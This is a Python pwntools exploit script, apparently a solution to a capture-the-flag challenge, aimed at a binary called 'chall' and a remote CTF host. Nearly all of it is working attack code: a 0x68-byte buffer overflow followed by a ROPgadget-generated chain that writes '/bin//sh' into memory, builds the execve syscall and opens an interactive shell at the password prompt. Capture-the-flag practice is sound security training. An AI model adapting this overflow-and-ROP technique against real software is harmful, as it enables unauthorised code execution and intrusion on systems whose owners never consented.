#!/usr/bin/env python3

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

from pwn import *
from struct import pack

exe = context.binary = ELF('chall')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("super_secure_system.ctf.fifthdoma.in", 9999)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *0x401db9
continue
'''.format(**locals())

# Generated by ROPgadget
# Moves "/bin//sh" into data portion, sets up registers for syscall, increments rax to 59 (execve)
# Modified syscall addr because of bad char

p = b'A'*0x68
p += pack('<Q', 0x00000000004077de) # pop rsi ; ret
p += pack('<Q', 0x00000000004ca0e0) # @ .data
p += pack('<Q', 0x000000000044e273) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000044fef1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004077de) # pop rsi ; ret
p += pack('<Q', 0x00000000004ca0e8) # @ .data + 8
p += pack('<Q', 0x0000000000443125) # xor rax, rax ; ret
p += pack('<Q', 0x000000000044fef1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040180e) # pop rdi ; ret
p += pack('<Q', 0x00000000004ca0e0) # @ .data
p += pack('<Q', 0x00000000004077de) # pop rsi ; ret
p += pack('<Q', 0x00000000004ca0e8) # @ .data + 8
p += pack('<Q', 0x000000000040172b) # pop rdx ; ret
p += pack('<Q', 0x00000000004ca0e8) # @ .data + 8
p += pack('<Q', 0x0000000000443125) # xor rax, rax ; ret

for i in range(59):
    p += pack('<Q', 0x0000000000483880) # add rax, 1 ; ret

p += pack('<Q', 0x000000000040159f) # syscall

# Send it
io = start()
io.recvuntil(b"Your password: ")
io.sendline(p)
io.interactive()

